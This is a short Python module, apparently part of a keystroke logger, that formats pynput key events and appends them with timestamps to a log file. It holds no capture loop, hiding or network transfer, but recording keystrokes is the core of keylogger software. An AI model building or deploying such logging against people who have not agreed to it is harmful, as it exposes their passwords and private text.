import time
import threading
from src.config import LOG_PATH

_lock = threading.Lock()

def _format_key(key):
    """
    Convert pynput Key or KeyCode to a readable string.
    - printable char -> the char
    - special keys -> <name>
    """
    try:
        # KeyCode with .char (printable characters)
        return key.char
    except AttributeError:
        # Special keys like Key.space, Key.enter -> show name in <>
        name = getattr(key, "name", str(key))
        return f"<{name}>"

def write_key(key):
    """
    Append a timestamped, human-readable entry to the log file.
    Thread-safe via a lock.
    """
    s = _format_key(key)
    line = f"{time.strftime('%Y-%m-%d %H:%M:%S')} {s}\n"
    with _lock:
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(line)
            f.flush()
